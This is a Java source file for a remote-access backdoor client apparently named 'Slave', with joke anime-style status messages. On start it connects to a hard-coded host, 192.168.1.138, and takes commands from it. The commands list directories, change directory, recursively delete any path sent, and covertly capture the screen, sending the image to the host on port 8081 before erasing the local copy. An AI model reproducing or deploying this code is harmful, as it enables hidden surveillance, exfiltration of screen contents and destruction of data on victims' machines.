import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;



public class Slave {

    public static void collectFiles(File directory) {
        File[] files = directory.listFiles();
        
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    collectFiles(file);
                } else {
                    System.out.println(file.getAbsolutePath());
                }
            }
        }
    }
    
    public static String listItemsInDirectory(String directoryPath) {
        StringBuilder result = new StringBuilder();

        try (DirectoryStream<Path> directoryStream = Files.newDirectoryStream(Paths.get(directoryPath))) {
            for (Path path : directoryStream) {
                String fileType = Files.isDirectory(path) ? "Directory" : "File";
                result.append(path.getFileName()).append(", Type: ").append(fileType).append(";");            
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return result.toString();
    }
    private static void changeDirectory(String directoryPath,PrintWriter pw) {
            File currentDirectory = new File(System.getProperty("user.dir"));
            if (directoryPath.equals("..")) {
                File parentDir = currentDirectory.getParentFile();
                if (parentDir != null) {
                    System.setProperty("user.dir", parentDir.getAbsolutePath());
                } else {
                    pw.println("Already at the root directory kyaaaa~");
                }
            }else{
                String targer= "/";
                if (!directoryPath.contains(String.valueOf(targer))){
                    File newDirectory = new File(currentDirectory, directoryPath);
                    if (newDirectory.exists() && newDirectory.isDirectory()) {
                        System.setProperty("user.dir", newDirectory.getAbsolutePath());
                    } else {
                        pw.println("Directory does not exist: " + newDirectory.getAbsolutePath());
                    }
                }else {
                    File newDirectory1 = new File(directoryPath);
                    if (newDirectory1.exists() && newDirectory1.isDirectory()) {
                        System.setProperty("user.dir", newDirectory1.getAbsolutePath());
                    } else {
                        pw.println("Directory does not exist: " + newDirectory1.getAbsolutePath());
                    }
                }
            }
        }
    private static void printCurrentDirectory(PrintWriter pw) {
        String currentDirectoryPath = System.getProperty("user.dir");
        pw.println("the current working directory desu: " + currentDirectoryPath);
    }

    private static void deleteFileOrDirectory(String path,PrintWriter pw) {
        File fileOrDir = new File(path);

        if (!fileOrDir.exists()) {
            pw.println("File or directory does not exist TT_TT: " + path);
            return;
        }

        if (fileOrDir.isDirectory()) {
            deleteDirectory(fileOrDir);
        } else {
            deleteFile(fileOrDir,pw);
        }
    }

    private static void deleteFile(File file,PrintWriter pw) {
        file.delete();
    }

    private static void deleteDirectory(File directory) {
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
            directory.delete();
            }
        }
    public static void terminateSocket(Socket socket,PrintWriter pw) {
        if (socket != null && !socket.isClosed()) {
            try {
                pw.println("the client has disconnected UwU");
                socket.close();         
            } catch (IOException e) {
                pw.println("error closing the socket TT_TT : " + e.getMessage());
            }
        } else {
            System.out.println("the socket chan is already closed or null >///<");
        }
    }
    public static void scroot(){
        try {
            Robot robot = new Robot();
            Socket ss = new Socket("192.168.1.138",8081);
            Toolkit toolkit = Toolkit.getDefaultToolkit();

            Rectangle screenSize = new Rectangle(toolkit.getScreenSize());

            BufferedImage screenshot = robot.createScreenCapture(screenSize);
            File outputfile = new File("slave_screenshot.png");
            ImageIO.write(screenshot, "png", outputfile);
            String imagePath = outputfile.getAbsolutePath();
            OutputStream oss = ss.getOutputStream();
            byte[] imageData = Files.readAllBytes(Paths.get(imagePath ));
            oss.write(imageData);
            oss.flush();
            oss.close();
            deleteFile(outputfile, null);
            ss.close();
            
        } catch (AWTException | IOException e) {
            e.printStackTrace();
        }
    }
    

    public static void main(String[] args) {
        try {
            String command="";
            final String url = "192.168.1.138";
            final int port = 8080;
            Socket cliensSocket = new Socket(url,port);
            OutputStream os = cliensSocket.getOutputStream();
            PrintWriter pw = new PrintWriter(os,true);
            BufferedReader br = new BufferedReader(new InputStreamReader(cliensSocket.getInputStream()));
            while (true) {
                command = br.readLine();
                switch (command) {
                    case "ls":
                        String currentDirectory = System.getProperty("user.dir");
                        String directoryContents = listItemsInDirectory(currentDirectory);
                        pw.println(directoryContents);
                        
                        break;    
                    case "cd":
                        String path = br.readLine();
                        changeDirectory(path,pw);

                        break;
                    case "pwd":
                        printCurrentDirectory(pw);

                        break;
                    case "rm":
                        String removable = br.readLine();
                        deleteFileOrDirectory(removable,pw);

                        break;
                    case "scrot":
                        scroot();
                        break;
                    case "bye":
                        terminateSocket(cliensSocket, pw);
                        break;
                    case "":
                        System.out.println("");;

                        break;
                    default:
                        System.out.println("");

                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
}
